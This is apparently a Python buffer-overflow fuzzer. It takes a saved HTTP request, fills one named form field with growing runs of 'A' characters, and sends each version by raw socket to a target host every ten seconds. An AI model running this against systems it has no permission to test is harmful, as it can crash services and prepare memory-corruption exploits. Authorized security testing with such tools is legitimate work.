#!/usr/bin/python3
import socket
import time
import sys

if len(sys.argv) != 5:
    print("\n Usage : " + sys.argv[0] + " <request file> <host ip> <port> <target form tag name>")
    sys.exit(1)

host = sys.argv[2]
port = int(sys.argv[3])
targetform = sys.argv[4]
size = 100

while(size < 2000):
    try:
        print("\nsending evil buffer with " + str(size) + " bytes")
        buffer = ""
        inputBuffer = "A" * size
        f = open(sys.argv[1], 'r')
        line = f.readline().replace("\n","\r\n")
        while len(line) > 0:
            if len(line.split("Content-Length")) > 1:
                line = "Content-Length: {to modify}\r\n"
            if len(line.split(targetform)) > 1:
                content = targetform + "=" + inputBuffer + "&" + line.split(targetform)[1].split("&")[1]
                line = content
            buffer += line
            line = f.readline().replace("\n","\r\n")
        f.close()
        buffer = buffer.replace("{to modify}", str(len(content)))
        #print(bytes(buffer, "utf-8")) # debug
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(bytes(buffer, "utf-8"))
        s.close()
        size += 100
        time.sleep(10)
    except:
        print("\nERROR : Could not connect")
        sys.exit(1)
